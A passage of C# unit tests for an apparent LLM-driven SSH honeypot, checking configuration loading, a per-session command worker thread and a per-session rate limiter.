        File.WriteAllText(tempPath, "ssh:\n  port: 23000\n  max-sessions: 10\nllm:\n  delay-ms: 250\n");

        try
        {
            var config = AppConfiguration.Load(tempPath);

            Assert.Equal(23000, config.Ssh.Port);
            Assert.Equal(10, config.Ssh.MaxSessions);
            Assert.Equal(250, config.Llm.DelayMs);
        }
        finally
        {
            File.Delete(tempPath);
        }
    }

    [Fact]
    public void Load_ProjectConfig_BindsRootSections()
    {
        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../config/app-config.yaml"));

        var config = AppConfiguration.Load(path);

        Assert.Equal("google/gemma-4-31b-it:free", config.Llm.Model);
        Assert.Equal("/var/log/funnypot", config.Logging.LogDir);
        Assert.Equal(3, config.Ssh.PasswordHarvestAttempt);
        Assert.Equal("/chat/completions", config.Api.OpenRouter.ChatEndpoint);
    }
}

public class SessionCommandWorkerTests
{
    [Fact]
    public void TryPost_RunsWorkOnDedicatedThreadInOrder()
    {
        using var worker = new SessionCommandWorker(Guid.NewGuid().ToString("N"));
        using var completed = new ManualResetEventSlim(false);
        var order = new List<int>();
        var executingThreadId = 0;

        Assert.True(worker.TryPost(() =>
        {
            executingThreadId = Environment.CurrentManagedThreadId;
            order.Add(1);
        }));
        Assert.True(worker.TryPost(() => order.Add(2)));
        Assert.True(worker.TryPost(() =>
        {
            order.Add(3);
            completed.Set();
        }));

        Assert.True(completed.Wait(TimeSpan.FromSeconds(2)));
        Assert.Equal(new[] { 1, 2, 3 }, order);
        Assert.Equal(worker.WorkerThreadId, executingThreadId);
        Assert.NotEqual(Environment.CurrentManagedThreadId, executingThreadId);
    }

    [Fact]
    public void TryPost_ReturnsFalseAfterDispose()
    {
        var worker = new SessionCommandWorker(Guid.NewGuid().ToString("N"));
        worker.Dispose();

        Assert.False(worker.TryPost(() => { }));
    }
}

public class LlmRateLimiterTests
{
    [Fact]
    public void IsAllowed_LimitsEachSessionIndependently()
    {
        var sessionA = $"test-session-{Guid.NewGuid():N}";
        var sessionB = $"test-session-{Guid.NewGuid():N}";
        LlmRateLimiter.Reset(sessionA);
        LlmRateLimiter.Reset(sessionB);

        for (var i = 0; i < 20; i++)
            Assert.True(LlmRateLimiter.IsAllowed(sessionA, out _));

        Assert.False(LlmRateLimiter.IsAllowed(sessionA, out var fallbackMessage));
        Assert.Contains("Rate limit exceeded", fallbackMessage);
        Assert.True(LlmRateLimiter.IsAllowed(sessionB, out _));

        LlmRateLimiter.Reset(sessionA);
        LlmRateLimiter.Reset(sessionB);
    }
}
